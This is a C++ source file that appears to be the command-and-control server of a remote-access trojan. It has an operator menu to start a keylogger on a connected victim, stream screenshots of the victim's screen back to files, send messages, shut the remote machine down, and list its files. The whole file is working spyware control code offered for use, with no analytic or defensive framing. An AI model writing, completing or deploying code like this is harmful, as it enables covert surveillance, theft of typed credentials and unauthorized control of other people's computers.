#include "sendM.h"
#include "../Tools/keylogger.h"
#include "../Tools/tree.h"
#include <iostream>
#include <string>
#include <atomic>
#include <thread>
#include <winsock2.h>
#include <fstream>

using namespace std;
atomic<bool> keyloggerRunning;
atomic<bool> messageBoxRunning;
atomic<bool> screenshotActive;

void screenShot(int clientSocket) {

    while (screenshotActive) {
        const char* message = "3";
        send(clientSocket, message, strlen(message), 0);
        
        char sizeBuffer[sizeof(size_t)];
        recv(clientSocket, sizeBuffer, sizeof(size_t), 0);
        size_t fileSize = *reinterpret_cast<size_t*>(sizeBuffer);
        ofstream outFile("../assets/received_image.bmp", ios::binary);
        if (!outFile.is_open()) {
            cerr << "Could not open output file" << endl;
            break;
        }

        char buffer[1024];
        size_t received = 0;
        while (received < fileSize) {
            size_t bytesRead = recv(clientSocket, buffer, sizeof(buffer), 0);
            if (bytesRead > 0) {
                outFile.write(buffer, bytesRead);
                received += bytesRead;
            } else {
                break;
            }
        }
        outFile.close();

        this_thread::sleep_for(chrono::seconds(1)); 
    }
}

void sendM(int clientSocket) {
    const char* menu = R"===(
PRESS 1 FOR KEYLOGGER
PRESS 2 FOR SENDING MESSAGE
PRESS 3 FOR SCREENRECORD
PRESS 4 FOR SHUTDOWN
PRESS 5 FOR TREE
)===";
    
    while (true) {
        cout << "Enter the number: ";
        string serverInput;
        getline(cin, serverInput);

        if (serverInput == "exit") {
            exit(0); 
        }  
        else if (serverInput == "1") {
            FILE* logFile = fopen("../assets/keylog.txt", "a+");
            send(clientSocket, serverInput.c_str(), serverInput.length(), 0);
            cout << "Starting Keylogger (type 'back' to exit message-sending mode):"<< endl;
            keyloggerRunning = true;
            thread keyloggerThread(keylogging, clientSocket);
            keyloggerThread.detach();
        } 
        
        else if (serverInput == "2") {
            send(clientSocket, serverInput.c_str(), serverInput.length(), 0);
            cout << "Enter messages (type 'back' to exit message-sending mode):" << endl;
            while (true) {
                string message;
                getline(cin, message);
                if (message == "back") {
                    send(clientSocket, "back", strlen("back"), 0);
                    break;
                }
                send(clientSocket, message.c_str(), message.length(), 0);
            }
            cout << "Exited message-sending mode." << endl;
            cout << menu;
        } 

        else if (serverInput == "3") {
            screenshotActive = true;
            cout << "Starting screenshot streaming... (type 'back' to stop)" << endl;
            thread screenShotThread(screenShot, clientSocket); 
            screenShotThread.detach(); 
            while (screenshotActive) {
                const char* message = "3";
                send(clientSocket, message, strlen(message), 0);
                string input;
                getline(cin, input);
                if (strcmp(input.c_str(),"back") == 0) {                  
                    screenshotActive = false; 
                    send(clientSocket, "back", strlen("back"), 0);
                    break;
                }
            }
            cout << "Exiting screenshot streaming mode." << endl;
            cout << menu;
        } 
        else if (serverInput == "4") {
            send(clientSocket, serverInput.c_str(),serverInput.length(),0);
        }
        else if (serverInput == "5") {
           treeGrower(clientSocket);
        }
        else if (serverInput == "back") {
            keyloggerRunning = false;
            cout << "KeyLogging stopped." << endl;
            cout << menu;
        } else {
            cout << "Invalid input, try again." << endl;
        }


    }
}